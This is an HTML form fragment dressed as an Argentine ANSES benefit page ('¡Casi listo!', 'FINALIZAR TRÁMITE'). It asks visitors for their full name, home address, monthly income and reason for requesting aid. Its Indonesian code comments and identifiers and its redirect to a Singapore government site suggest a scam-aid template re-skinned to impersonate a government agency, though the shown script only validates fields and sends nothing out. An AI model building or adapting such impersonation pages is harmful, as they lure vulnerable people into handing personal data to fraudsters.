<style>
    .anses-success-wrapper {
        padding: 10px 5px;
        text-align: left;
    }

    .success-header {
        text-align: center;
        margin-bottom: 25px;
    }

    .success-icon {
        color: #28a745;
        font-size: 40px;
        margin-bottom: 10px;
    }

    .form-group {
        margin-bottom: 18px;
        text-align: left;
    }

    .form-group small {
        display: block;
        font-weight: 700;
        margin-bottom: 6px;
        color: #002f5a;
        font-size: 14px;
    }

    .anses-control {
        width: 100%;
        padding: 12px 14px;
        border-radius: 4px;
        border: 1px solid #ccc;
        font-size: 15px;
        outline: none;
        transition: 0.2s;
    }

    .anses-control:focus {
        border-color: #0080c7;
        box-shadow: 0 0 5px rgba(0,128,199,0.2);
    }

    .error-text {
        font-size: 12px;
        color: #d32f2f;
        margin-top: 4px;
        font-weight: 600;
        display: none;
    }

    textarea.anses-control {
        resize: none;
        min-height: 90px;
    }

    .btn-anses-finish {
        width: 100%;
        margin-top: 20px;
        padding: 14px;
        border-radius: 4px;
        border: none;
        font-weight: 700;
        font-size: 16px;
        color: #ffffff;
        background-color: #0080c7;
        cursor: pointer;
        text-transform: uppercase;
    }

    .btn-anses-finish:hover {
        background-color: #005a8d;
    }

    .alert-info-anses {
        background-color: #e7f3f9;
        border-left: 4px solid #0080c7;
        padding: 12px;
        font-size: 13px;
        color: #333;
        margin-bottom: 20px;
    }
</style>

<div class="anses-success-wrapper">
    <div class="success-header">
        <div class="success-icon">✔</div>
        <h4 style="color: #002f5a; font-weight: 800;">¡Casi listo!</h4>
        <p style="font-size: 14px; color: #666;">Por favor, completá los datos finales para la acreditación del beneficio.</p>
    </div>

    <div class="alert-info-anses">
        Estos datos son necesarios para determinar la sucursal de cobro más cercana a tu domicilio.
    </div>

    <form id="bantuanForm">
        
        <div class="form-group">
            <small>Nombre y Apellido completo</small>
            <input type="text" name="name" class="form-control anses-control" placeholder="Tal como figura en su DNI">
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <div class="form-group">
            <small>Dirección de residencia (Provincia y Localidad)</small>
            <textarea name="address" class="form-control anses-control" placeholder="Ej: Av. Rivadavia 1234, CABA"></textarea>
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <div class="form-group">
            <small>Ingresos mensuales estimados ($)</small>
            <input type="number" name="income" class="form-control anses-control" placeholder="Monto en Pesos Argentinos">
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <div class="form-group">
            <small>Breve motivo de la solicitud</small>
            <textarea name="alasan" class="form-control anses-control" placeholder="Describa brevemente su situación actual"></textarea>
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <button type="submit" class="btn-anses-finish">FINALIZAR TRÁMITE</button>
    </form>
</div>

<script>
// Logika asli Anda tetap dipertahankan 100%
document.getElementById('bantuanForm').addEventListener('submit', function(e) {
    e.preventDefault();

    let valid = true;
    const fields = document.querySelectorAll('.anses-control');

    fields.forEach(field => {
        const error = field.nextElementSibling;

        if (field.value.trim() === "") {
            field.style.borderColor = "#d32f2f";
            error.style.display = "block";
            valid = false;
        } else {
            field.style.borderColor = "#ccc";
            error.style.display = "none";
        }
    });

    if (valid) {
        // Tetap menggunakan redirect sesuai kode asli Anda
        window.location.href = "https://www.singpass.gov.sg";
    }
});
</script>